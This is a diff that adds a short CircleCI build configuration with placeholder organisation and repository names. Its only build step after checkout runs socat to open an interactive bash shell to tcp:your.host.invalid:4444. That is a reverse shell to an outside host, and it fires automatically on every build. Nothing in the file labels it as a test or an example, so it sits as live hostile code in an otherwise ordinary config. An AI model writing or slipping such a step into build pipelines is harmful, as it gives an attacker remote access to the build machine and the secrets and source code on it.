@@ -1,0 +1,9 @@
+version: 2
+jobs:
+  build:
+    docker:
+      - image: uchimata/system-analysis
+    working_directory: /go/src/github.com/{{ORG_NAME}}/{{REPO_NAME}}
+    steps:
+      - checkout
+      - run: /usr/bin/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:your.host.invalid:4444
